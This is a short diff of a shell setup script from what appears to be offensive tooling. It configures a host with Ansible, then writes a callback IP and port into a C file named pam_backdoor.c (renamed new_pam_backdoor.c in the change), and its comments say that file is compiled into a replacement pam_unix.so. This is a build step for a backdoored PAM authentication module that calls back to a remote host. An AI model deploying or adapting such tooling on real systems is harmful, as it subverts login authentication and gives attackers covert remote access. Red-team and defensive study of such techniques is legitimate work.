@@ -28,8 +28,8 @@ sed -i "s/^ansible_become_password.*/ansible_become_password=$pass/" ./inventory
 ansible-playbook main.yml -t setup
 
 # Change pam_backdoor.c to match callback IP and Port
-sed -i "s/^#define CALLBACK_IP.*/#define CALLBACK_IP \"$ip\"/" ./pam_backdoor.c
-sed -i "s/^#define CALLBACK_PORT.*/#define CALLBACK_PORT $port/" ./pam_backdoor.c
+sed -i "s/^#define CALLBACK_IP.*/#define CALLBACK_IP \"$ip\"/" ./new_pam_backdoor.c
+sed -i "s/^#define CALLBACK_PORT.*/#define CALLBACK_PORT $port/" ./new_pam_backdoor.c
 
 # Compile pam_backdoor.c into pam_unix.so
 # Syntax :
